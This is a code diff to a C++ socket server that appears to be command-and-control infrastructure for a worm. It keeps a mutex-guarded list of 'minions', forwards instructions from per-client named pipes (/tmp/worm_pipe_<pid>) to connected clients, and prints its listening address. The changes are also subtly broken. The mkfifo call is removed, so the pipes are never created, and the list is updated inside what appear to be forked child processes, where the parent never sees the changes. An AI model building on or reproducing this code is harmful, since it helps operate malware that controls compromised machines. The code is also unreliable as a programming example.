@@ -14,6 +14,27 @@
 
 #define PORT 10101
 
+std::vector<Minion> minions;
+std::mutex minions_mutex;
+
+void register_minion(pid_t pid) {
+    std::lock_guard<std::mutex> lock(minions_mutex);
+    Minion m;
+    m.pid = pid;
+    snprintf(m.pipe_path, sizeof(m.pipe_path), "/tmp/worm_pipe_%d", pid);
+    minions.push_back(m);
+}
+
+void unregister_minion(pid_t pid) {
+    std::lock_guard<std::mutex> lock(minions_mutex);
+    for (auto it = minions.begin(); it != minions.end(); ++it) {
+        if (it->pid == pid) {
+            minions.erase(it);
+            break;
+        }
+    }
+}
+
 void sigchld_handler(int s) {
     int saved_errno = errno;
     while(waitpid(-1, NULL, WNOHANG) > 0);
@@ -21,15 +42,12 @@ void sigchld_handler(int s) {
 }
 
 void handleChild(int client_fd, pid_t pid) {
-    char pipe_path[64];
-    snprintf(pipe_path, sizeof(pipe_path), "/tmp/worm_pipe_%d", pid);
-    mkfifo(pipe_path, 0666);
+    register_minion(pid);
 
-    int pipe_fd = open(pipe_path, O_RDONLY | O_NONBLOCK);
+    int pipe_fd = open(minions.back().pipe_path, O_RDONLY | O_NONBLOCK);
     char buffer[1024];
 
     while (true) {
-        // Check for instructions from pipe
         ssize_t bytes_read = read(pipe_fd, buffer, sizeof(buffer) - 1);
         if (bytes_read > 0) {
             buffer[bytes_read] = '\0';
@@ -37,14 +55,14 @@ void handleChild(int client_fd, pid_t pid) {
             if (send(client_fd, buffer, bytes_read, 0) < 0) break;
         }
 
-        // Check for minion heartbeat/input
         bytes_read = recv(client_fd, buffer, sizeof(buffer) - 1, MSG_DONTWAIT);
-        if (bytes_read == 0) break; // Disconnected
+        if (bytes_read == 0) break;
         sleep(1);
     }
 
     close(pipe_fd);
-    unlink(pipe_path);
+    unlink(minions.back().pipe_path);
+    unregister_minion(pid);
     close(client_fd);
     exit(0);
 }
@@ -70,6 +88,9 @@ void server() {
 
     bind(server_fd, (struct sockaddr *)&address, sizeof(address));
     listen(server_fd, 20);
+
+    char ip_str[INET_ADDRSTRLEN];
+    printf("Server listening on %s:%d\n", inet_ntop(AF_INET, &address.sin_addr, ip_str, INET_ADDRSTRLEN), ntohs(address.sin_port));
 
     while (true) {
         client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
